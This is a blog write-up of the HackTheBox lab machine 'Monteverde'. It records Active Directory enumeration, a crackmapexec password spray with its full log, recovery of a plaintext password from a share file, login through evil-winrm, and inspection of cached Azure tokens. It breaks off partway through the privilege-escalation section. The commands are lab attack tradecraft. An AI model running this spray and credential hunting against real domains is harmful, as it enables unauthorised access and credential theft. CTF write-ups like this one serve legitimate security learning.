---
title: "HTB Montverde Writeup"
date: 2023-07-11
tags: ["CTF","Security"]
description: "Some Active Directory goodness"
draft: false
type: page
---

# HTB "Montverde" Writeup

Montverde is a medium rank Active Directory Box on HTB that had some interesting twists on the privesc, but classic AD on the initial access.


## Enumeration

We can start out with an nmap scan.

```bash
[~/htb/montverde]$ cat montverde.nmap
# Nmap 7.94 scan initiated Tue Jul 11 18:35:51 2023 as: nmap -sC -sV -oA montverde -v -Pn 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.033s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-11 22:36:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-07-11T22:36:10
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

Here we see some pretty standard AD ports, with kerberos.

I also ran `enum4linux` as that has been a very helpful tool to initially footprint a domain.

```bash
[~/htb/montverde]$ enum4linux 10.10.10.172
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jul 11 18:36:27 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.172 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.10.172 )================================

Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================( Session Check on 10.10.10.172 )===================================


[+] Server 10.10.10.172 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.10.172 )================================

Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.10.172 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.10.172 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.10.172 )=======================================

index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2     Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos     Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally MorganDesc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp  Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =================================( Share Enumeration on 10.10.10.172 )=================================

do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.172


 ============================( Password Policy Information for 10.10.10.172 )============================



[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 7


 =======================================( Groups on 10.10.10.172 )=======================================


[+] Getting builtin groups:

group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:

Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+]  Getting local group memberships:

Group: ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+]  Getting domain group memberships:

Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group: 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group: 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group: 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary

 ==================( Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.10.172 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Tue Jul 11 18:37:32 2023
```

This gave us a lot of interesting info, like users, groups, crucially there is no lockout on the password policy.

One interesting group is the azure admins.

`ldapsearch` provides even more enumeration of the domain.

```bash
[~/htb/montverde]$ ldapsearch -H ldap://10.10.10.172 -x -s base namingcontexts - simple auth
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts - simple auth
#

#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```bash
ldapsearch -H ldap://10.10.10.172 -x -b "DC=megabank,DC=local" >
 ldapsearch.out
```

Notably, the domain was just spewing out so much info unauthenticated, I had to learn how to filter `ldapsearch`.

```bash
ldapsearch -H ldap://10.10.10.172 -x -b "DC=megabank,DC=local" -W "(objectclass=person)" cn uid homeDirectory
```

## Foothold

Since there is no lockout policy, we can spray and pray.

The wordlist that I went with, was the one that was provided in the walkthrough after getting stuck for a bit. We can combine the usernames, along with a list of bad corporate [passwords](https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/weak-corporate-passwords/english-basic.txt).

Throw the userlist and passlist into `crackmapexec` and see what happens.

```bash
[~/htb/montverde]$ crackmapexec smb -u users.txt -p spraylist.txt -d megabank --continue-on-success -dc 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:c) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\mhope:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [+] c\SABatchJobs:SABatchJobs
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:Letmein123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Password1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Welcome1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Letmein1 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Password123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Welcome123 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:Letmein123 STATUS_LOGON_FAILURE
```

We got one hit:

```
SMB         10.10.10.172    445    MONTEVERDE       [+] c\SABatchJobs:SABatchJobs
```



Now we can start doing some stuff like listing shares:

```bash
[~/htb/montverde]$ smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
[+] IP: 10.10.10.172:445        Name: megabank.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        users$                                                  READ ONLY
```

azure_uploads looks interesting.

I also did an `ldapdomaindump` since I have creds now.

```bash
ldapdomaindump -u megabank.local\\SABatchJobs -p 'SABatchJobs' 10.10.10.172 -o ldap/
```

This gives me an easy way to look through domain info.

After getting stuck for a bit, I learned a new tactic to use smbmap to look for interesting files in shares.

```bash
smbmap -u SABatchJobs -p SABatchJobs -d megabank -H 10.10.10.172 -A '(xlsx|docx|txt|xml)' -R
```

This gave us `azure.xml` with another set of creds.

```bash
[~/htb/montverde]$ cat 10.10.10.172-users_mhope_azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

This was promptly fed back into crackmapexec.

```bash
[~/htb/montverde]$ crackmapexec smb -u users.txt -p '4n0therD4y@n0th3r$' -d megabank --continue-on-success -dc 10.10.10.172
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:c) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [+] c\mhope:4n0therD4y@n0th3r$
SMB         10.10.10.172    445    MONTEVERDE       [-] c\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] c\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE
```

Here we found that this was valid for `mhope`.

From looking through the `ldapdomaindump` data I know that this user is in the Remote Management Users group, and so we can winrm in.

```bash
evil-winrm -u mhope -p '4n0therD4y@n0th3r$' -i 10.10.10.172
```

## Privesc

Immediately I noticed the `.Azure` folder in the home folder of my user.

I downloaded it and searched on some of the files. Saw [this](https://github.com/Azure/azure-powershell/issues/9649) github issue, and went down the rabbit hole of trying to exploit the access tokens in there.

```bash
*Evil-WinRM* PS C:\Users\mhope> Get-AzContext -ListAvailable

Name                                     Account                                              SubscriptionName                                    Environment                                         TenantId
----                                     -------                                              ----------------                                    -----------                                         --------
372efea9-7bc4-4b76-8839-984b45edfb98 ... john@a67632354763outlook.onmicrosoft.com                                                                 AzureCloud                                          372efea9-7bc4-4b76-8839-984b45edfb98


*Evil-WinRM* PS C:\Users\mhope> Import-AzContext -Path c:\Users\mhope\tokencahe.json

Account                                  SubscriptionName TenantId                             Environment
-------                                  ---------------- --------                             -----------
john@a67632354763outlook.onmicrosoft.com                  372efea9-7bc4-4b76-8839-984b45edfb98 AzureCloud
```

`tokencahe.json` was the json that I pulled out of the .dat file to use to authenticate here.

I saw what azure powershell modules were loaded and then attempted to use some of those for privesc.

```bash
*Evil-WinRM* PS C:\Users\mhope> gci -Filter *Az.* -Path "C:\Program Files\windowspowershell\modules"


    Directory: C:\Program Files\windowspowershell\modules


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/3/2020   5:29 AM                Az.Accounts
d-----         1/3/2020   5:29 AM                Az.Resources

*Evil-WinRM* PS C:\program files\windowspowershell\modules\az.accounts\1.6.6> Get-Command -CommandType Cmdlet | findstr /r "Az."
 Cmdlet          Add-AzADGroupMember                                1.9.0      Az.Resources
Cmdlet          Add-AzEnvironment                                  1.6.6      Az.Accounts
Cmdlet          Clear-AzContext                                    1.6.6      Az.Accounts
Cmdlet          Clear-AzDefault                                    1.6.6      Az.Accounts
Cmdlet          Connect-AzAccount                                  1.6.6      Az.Accounts
Cmdlet          Disable-AzContextAutosave                          1.6.6      Az.Accounts
Cmdlet          Disable-AzDataCollection                           1.6.6      Az.Accounts
Cmdlet          Disable-AzureRmAlias                               1.6.6      Az.Accounts
Cmdlet          Disconnect-AzAccount                               1.6.6      Az.Accounts
Cmdlet          Enable-AzContextAutosave                           1.6.6      Az.Accounts
Cmdlet          Enable-AzDataCollection                            1.6.6      Az.Accounts
Cmdlet          Enable-AzureADConnectHealth                        1.0        AzureADConnectHealthSync
Cmdlet          Enable-AzureRmAlias                                1.6.6      Az.Accounts
Cmdlet          Export-AzResourceGroup                             1.9.0      Az.Resources
Cmdlet          Get-AzADAppCredential                              1.9.0      Az.Resources
Cmdlet          Get-AzADApplication                                1.9.0      Az.Resources
Cmdlet          Get-AzADGroup                                      1.9.0      Az.Resources
Cmdlet          Get-AzADGroupMember                                1.9.0      Az.Resources
Cmdlet          Get-AzADServicePrincipal                           1.9.0      Az.Resources
Cmdlet          Get-AzADSpCredential                               1.9.0      Az.Resources
Cmdlet          Get-AzADUser                                       1.9.0      Az.Resources
Cmdlet          Get-AzContext                                      1.6.6      Az.Accounts
Cmdlet          Get-AzContextAutosaveSetting                       1.6.6      Az.Accounts
Cmdlet          Get-AzDefault                                      1.6.6      Az.Accounts
Cmdlet          Get-AzDenyAssignment                               1.9.0      Az.Resources
Cmdlet          Get-AzDeployment                                   1.9.0      Az.Resources
Cmdlet          Get-AzDeploymentOperation                          1.9.0      Az.Resources
Cmdlet          Get-AzEnvironment                                  1.6.6      Az.Accounts
Cmdlet          Get-AzLocation                                     1.9.0      Az.Resources
Cmdlet          Get-AzManagedApplication                           1.9.0      Az.Resources
Cmdlet          Get-AzManagedApplicationDefinition                 1.9.0      Az.Resources
Cmdlet          Get-AzManagementGroup                              1.9.0      Az.Resources
Cmdlet          Get-AzPolicyAlias                                  1.9.0      Az.Resources
Cmdlet          Get-AzPolicyAssignment                             1.9.0      Az.Resources
Cmdlet          Get-AzPolicyDefinition                             1.9.0      Az.Resources
Cmdlet          Get-AzPolicySetDefinition                          1.9.0      Az.Resources
Cmdlet          Get-AzProfile                                      1.6.6      Az.Accounts
Cmdlet          Get-AzProviderFeature                              1.9.0      Az.Resources
Cmdlet          Get-AzProviderOperation                            1.9.0      Az.Resources
Cmdlet          Get-AzResource                                     1.9.0      Az.Resources
Cmdlet          Get-AzResourceGroup                                1.9.0      Az.Resources
Cmdlet          Get-AzResourceGroupDeployment                      1.9.0      Az.Resources
Cmdlet          Get-AzResourceGroupDeploymentOperation             1.9.0      Az.Resources
Cmdlet          Get-AzResourceLock                                 1.9.0      Az.Resources
Cmdlet          Get-AzResourceProvider                             1.9.0      Az.Resources
